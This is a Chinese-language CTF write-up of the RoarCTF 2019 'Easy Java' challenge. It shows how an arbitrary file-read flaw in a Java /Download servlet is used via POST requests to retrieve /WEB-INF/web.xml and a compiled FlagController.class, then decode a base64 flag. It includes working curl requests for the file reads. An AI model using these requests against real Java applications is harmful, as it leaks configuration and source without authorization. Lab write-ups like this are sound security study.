---
date: 2026-11-24 18:15:00
slug: roarctf2019-easy-java
categories:
  - Java
  - 文件读取
---

# [RoarCTF 2019] Easy Java — WEB-INF 是 Java 的 /etc/passwd

> **题目类型**：Java 任意文件读取 — 读 `WEB-INF` 拿源码与 flag
>
> **Flag**：`CTF2{a2fddc84-860c-45f0-94ca-f0e41caaa50f}`

---

## 题目概述

题目提示是 Java。**先确认技术栈：DevTools → 存储 → Cookie，看到 `JSESSIONID`，就坐实了。**

**页面右上角有个 `help`，点下去是一个下载功能。**这就是这道题的入口。

---

## 解题过程

### Step 1：help 按钮就是一个文件读取点

**点 help，请求长这样：**

```
/Download?filename=help.docx
```

**`filename` 直接当路径用——这就是任意文件读取。**

### Step 2：GET 不行，换 POST

**同样的参数，GET 请求没反应。**换成 POST：

```powershell
curl.exe -s -X POST --data-urlencode "filename=/WEB-INF/web.xml" "http://目标/Download"
```

**这次出来了。**

**原因是 `DownloadController` 只处理 POST 请求（`doPost`），`doGet` 没实现。**所以这个点看着像 GET 接口，其实只认 POST。

### Step 3：读 web.xml，找到真正干活的 Servlet

```xml
<servlet>
    <servlet-name>FlagController</servlet-name>
    <servlet-class>com.wm.ctf.FlagController</servlet-class>
</servlet>
<servlet-mapping>
    <servlet-name>FlagController</servlet-name>
    <url-pattern>/Flag</url-pattern>
</servlet-mapping>
```

**两个信息：**

```
FlagController    在 com.wm.ctf 包里
映射到 /Flag       ——但它不直接给你 flag
```

**flag 写在 `FlagController.class` 里。**

### Step 4：读 class 文件——路径别加前缀

**这里有个坑，我踩了一次。**

**Download 的参数是相对 `WEB-INF/classes/` 的**（servlet 里是 `getResourceAsStream("/WEB-INF/classes/" + filename)`）。**所以：**

```
✗ WEB-INF/classes/com/wm/ctf/FlagController.class     ← 重复了前缀，读不到
✓ com/wm/ctf/FlagController.class                      ← 对
```

**我第一次写的是前者，结果没有任何回显——不是文件不存在，是路径拼出来变成了 `/WEB-INF/classes/WEB-INF/classes/...`。**

**正确请求：**

```powershell
curl.exe -s -X POST --data-urlencode "filename=com/wm/ctf/FlagController.class" "http://目标/Download" -o flag.class
```

### Step 5：class 是二进制，要搜里面的明文

**`.class` 是编译后的字节码，直接在终端里看是一堆乱码。**保存成文件后用编辑器打开，**在可读区里能看到一段 base64。**

**Notepad++ 打开，`Ctrl+F` 搜 `flag` 或直接搜 `=`（base64 结尾常见）：**

```text
ZmxhZ3thMmZkZGM4NC04NjBjLTQ1ZjAtOTRjYS1mMGU0MWNhYWE1MGZ9
```

**解码：**

```powershell
python -c "import base64;print(base64.b64decode('ZmxhZ3thMmZkZGM4NC04NjBjLTQ1ZjAtOTRjYS1mMGU0MWNhYWE1MGZ9').decode())"
```

```text
CTF2{a2fddc84-860c-45f0-94ca-f0e41caaa50f}
```

---

| 关键点 | 说明 |
| --- | --- |
| 判技术栈 | Cookie 里有 `JSESSIONID` → Java |
| 入口 | `help` → `/Download?filename=...` |
| 请求方式 | **必须 POST**，GET 不处理 |
| 必读文件 | `/WEB-INF/web.xml`（Servlet 映射全在里面） |
| 路径基准 | `filename` 相对 `WEB-INF/classes/`，别再写这段前缀 |
| class 文件 | 二进制，用编辑器/`strings` 搜 base64 明文 |
| 类比 | `/WEB-INF` 在 Java 里约等于 Linux 的 `/etc/passwd` |

---

??? note "完整请求"

    ```powershell
    # ① 先看 web.xml
    curl.exe -s -X POST --data-urlencode "filename=/WEB-INF/web.xml" "http://目标/Download"

    # ② 读业务类（注意不要带 WEB-INF/classes 前缀）
    curl.exe -s -X POST --data-urlencode "filename=com/wm/ctf/FlagController.class" "http://目标/Download" -o flag.class

    # ③ 搜 base64 并解码
    # Notepad++ 打开 flag.class，Ctrl+F 搜 ZmxhZ 或 "="
    python -c "import base64;print(base64.b64decode('ZmxhZ3thMmZkZGM4NC04NjBjLTQ1ZjAtOTRjYS1mMGU0MWNhYWE1MGZ9').decode())"
    ```

??? note "这题踩的坑"

    **① 路径加了 `WEB-INF/classes/`**

    **源码里已经帮你拼了 `"/WEB-INF/classes/"`**，你再写一遍就变成双层路径，**表现是“没有任何回显”，很容易误判成文件不存在。**

    **② 用 GET 试**

    `doGet` 没实现，所以 GET 一定空。**看到“参数对但没反应”，先换请求方法，再怀疑路径。**

    **③ 直接看终端的 class 输出**

    **二进制里有不可见字符，终端会把内容吃掉或显示成乱码。**一定要 `-o` 存成文件，用编辑器/`strings` 看。

    **④ 只记 `/WEB-INF/web.xml`**

    **`web.xml` 只告诉你有哪些 Servlet；真正的 flag 在对应的 `.class` 里。**这是两步，不是一步。
